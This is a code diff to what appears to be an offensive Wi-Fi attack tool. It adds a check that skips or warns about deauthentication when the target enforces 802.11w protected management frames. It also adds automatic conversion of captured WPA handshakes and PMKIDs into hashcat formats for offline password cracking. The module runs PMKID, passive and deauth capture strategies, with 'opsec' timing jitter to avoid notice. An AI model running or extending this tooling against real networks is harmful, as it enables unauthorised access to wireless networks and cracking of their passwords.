@@ -14,8 +14,10 @@ from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
 
 from ..core.config import Config
 from ..core.opsec import OpsecEngine
+from ..core.logger import get_logger
 
 console = Console()
+log = get_logger("attack")
 
 
 class AttackStrategy(Enum):
@@ -46,14 +48,29 @@ class AttackModule:
         self.config = config
         self.opsec = opsec
 
-    def select_strategy(self) -> list[AttackStrategy]:
+    def select_strategy(
+        self,
+        pmf_info: dict | None = None,
+    ) -> list[AttackStrategy]:
         strategies = []
 
         strategies.append(AttackStrategy.PMKID)
         strategies.append(AttackStrategy.PASSIVE)
 
         if self.config.stealth.deauth_allowed:
-            strategies.append(AttackStrategy.DEAUTH)
+            if pmf_info and pmf_info.get("pmf_required"):
+                console.print(
+                    "[red]PMF required on target — skipping deauth strategy "
+                    "(802.11w blocks unauthenticated management frames)[/red]"
+                )
+                log.info("Deauth skipped: PMF required on target")
+            elif pmf_info and pmf_info.get("pmf_capable"):
+                console.print(
+                    "[yellow]PMF capable on target — deauth may fail for PMF-enabled clients[/yellow]"
+                )
+                strategies.append(AttackStrategy.DEAUTH)
+            else:
+                strategies.append(AttackStrategy.DEAUTH)
 
         console.print(
             f"[dim]Strategy order: "
@@ -65,11 +82,12 @@ class AttackModule:
         self, interface: str, bssid: str, channel: int,
         client_mac: str | None = None,
         output_dir: str = "./captures",
+        pmf_info: dict | None = None,
     ) -> CaptureResult:
         os.makedirs(output_dir, exist_ok=True)
         self.opsec.pre_operation()
 
-        strategies = self.select_strategy()
+        strategies = self.select_strategy(pmf_info=pmf_info)
         for strategy in strategies:
             console.print(f"[cyan]Trying {strategy.value}...[/cyan]")
 
@@ -86,12 +104,55 @@ class AttackModule:
 
             if result.success:
                 console.print(f"[green]Capture successful via {strategy.value}![/green]")
+                result = self._auto_export_hash(result, output_dir)
                 return result
 
             console.print(f"[yellow]{strategy.value} failed, trying next...[/yellow]")
             self.opsec.jitter(2.0)
 
         return CaptureResult(success=False, strategy=strategies[-1], message="All strategies exhausted")
+
+    def _auto_export_hash(self, result: CaptureResult, output_dir: str) -> CaptureResult:
+        """Auto-convert capture to hashcat formats (hc22000 + hccapx) if not already done."""
+        if result.hash_file:
+            return result
+
+        if not result.capture_file or not os.path.exists(result.capture_file):
+            return result
+
+        cap = result.capture_file
+        base = os.path.splitext(cap)[0]
+
+        hc22000_path = f"{base}.hc22000"
+        try:
+            conv = subprocess.run(
+                ["hcxpcapngtool", "-o", hc22000_path, cap],
+                capture_output=True, text=True, timeout=30,
+            )
+            if conv.returncode == 0 and os.path.exists(hc22000_path) and os.path.getsize(hc22000_path) > 0:
+                result.hash_file = hc22000_path
+                console.print(f"[green]Hash exported: {hc22000_path}[/green]")
+                log.info("Auto-exported hc22000: %s", hc22000_path)
+            else:
+                console.print("[dim]hcxpcapngtool: no hashes extracted[/dim]")
+        except FileNotFoundError:
+            console.print("[dim]hcxpcapngtool not found — skipping hc22000 export[/dim]")
+        except subprocess.TimeoutExpired:
+            pass
+
+        hccapx_path = f"{base}.hccapx"
+        try:
+            conv = subprocess.run(
+                ["hcxpcapngtool", "--hccapx", hccapx_path, cap],
+                capture_output=True, text=True, timeout=30,
+            )
+            if conv.returncode == 0 and os.path.exists(hccapx_path) and os.path.getsize(hccapx_path) > 0:
+                console.print(f"[green]Legacy hash exported: {hccapx_path}[/green]")
+                log.info("Auto-exported hccapx: %s", hccapx_path)
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            pass
+
+        return result
 
     def _capture_pmkid(
         self, interface: str, bssid: str, channel: int, output_dir: str,
